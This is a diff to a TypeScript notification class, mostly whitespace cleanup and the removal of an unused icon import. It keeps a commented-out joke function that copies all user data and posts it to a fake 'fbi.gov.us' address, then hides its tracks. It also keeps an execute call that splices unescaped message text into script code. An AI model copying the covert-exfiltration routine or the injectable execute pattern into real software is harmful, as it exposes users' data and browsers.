@@ -1,6 +1,6 @@
-import { NotificationType,NotificationIcon } from "./enums/NotificationType";
+import { NotificationType, NotificationIcon } from "./enums/NotificationType";
 import Browser from "./Browser";
-import fontawesome, { icon } from "@fortawesome/fontawesome";
+
 export default class Notifier {
     constructor(notifierBrowser: Browser) {
         this._notifierBrowser = notifierBrowser;
@@ -12,7 +12,7 @@ export default class Notifier {
         let background = "purple";
         let messageColor = "white";
         let icon = "";
-
+        
         switch (type) {
             case NotificationType.Info:
                 background = "rgba(192,192,192,0.9)";
@@ -32,7 +32,7 @@ export default class Notifier {
         if (title == "")
             title = this.getTitle(type);
 
-        this._notifierBrowser.execute(`parseData('${JSON.stringify([title, message, background, messageColor,icon])}')`);
+        this._notifierBrowser.execute(`parseData('${JSON.stringify([title, message, background, messageColor, icon])}')`);
     }
 
     private getTitle(notificationType: NotificationType): string {
@@ -44,11 +44,11 @@ export default class Notifier {
             return "Błąd";
     }
 
-   /* private thisFunctionDefinitlyDidntSendInformationAboutYouToFBI()
-    {
-        let yourInformation = copy.all();
-        api.post(`http://fbi.gov.us/${yourFBIAgentID}/information`,yourInformation);
-        clean_everything();
-        hide();
-    } */
+    /* private thisFunctionDefinitlyDidntSendInformationAboutYouToFBI()
+     {
+         let yourInformation = copy.all();
+         api.post(`http://fbi.gov.us/${yourFBIAgentID}/information`,yourInformation);
+         clean_everything();
+         hide();
+     } */
 }
